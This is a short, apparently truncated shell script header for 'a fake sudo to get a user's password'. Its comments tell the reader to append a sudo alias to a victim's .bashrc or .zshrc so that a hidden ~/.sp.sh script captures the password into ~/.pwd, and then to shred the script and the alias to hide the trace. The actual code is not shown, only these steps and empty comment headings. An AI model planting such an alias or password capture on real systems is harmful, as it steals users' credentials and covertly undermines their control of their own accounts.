# A fake sudo to get a user's password
# By Michael C. Dim - mk@mcdim.xyz

# 1. Add this line to *THE END* of the user's
#    .bashrc or .zshrc or .mkshrc etc. :
#
#    alias sudo="~/.sp.sh; sudo"
#
# 2. Put this script in the user's home
#    directory as ~/.sp.sh
#
# 3. The password will be stored in ~/.pwd
#
# 4. This script and the last .bashrc line 
#    will self-destruct and be shredded.

# does not need a password to use sudo

# Save the password
